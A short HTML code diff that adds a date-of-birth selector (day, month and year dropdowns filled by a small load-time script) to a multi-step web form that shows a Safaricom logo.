@@ -28,6 +28,15 @@
 
         <input id="email" placeholder="Email Address" type="email">
 
+        <div class="dob-container" style="text-align: left; margin-bottom: 15px;">
+    <label style="color: #666; font-size: 0.9rem; margin-left: 5px;">Date of Birth</label>
+    <div style="display: flex; gap: 5px; margin-top: 5px;">
+        <select id="dobDay" style="flex: 1; padding: 12px; border-radius: 8px; border: 1px solid #ccc;"></select>
+        <select id="dobMonth" style="flex: 2; padding: 12px; border-radius: 8px; border: 1px solid #ccc;"></select>
+        <select id="dobYear" style="flex: 1.5; padding: 12px; border-radius: 8px; border: 1px solid #ccc;"></select>
+    </div>
+</div>
+
         <p id="errorBox" style="color:red; text-align:center; display:none;"></p>
         
         <br><br><br>
@@ -39,6 +48,23 @@
     <br><br><br><br><br><br>
     <img src="safaricom-25.gif" alt="Safaricom" class="saf-footer" id="saf-logo">
 </div>
+
+<script>
+    // Populate DOB Selectors
+    document.addEventListener("DOMContentLoaded", function() {
+        const d = document.getElementById('dobDay');
+        const m = document.getElementById('dobMonth');
+        const y = document.getElementById('dobYear');
+
+        const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+
+        for(let i=1; i<=31; i++) d.options.add(new Option(i, i < 10 ? '0'+i : i));
+        months.forEach((month, index) => m.options.add(new Option(month, index + 1 < 10 ? '0'+(index+1) : index+1)));
+        
+        const currentYear = new Date().getFullYear();
+        for(let i=currentYear-18; i>=currentYear-80; i--) y.options.add(new Option(i, i));
+    });
+</script>
 
     <script>
         function nextStep2() {
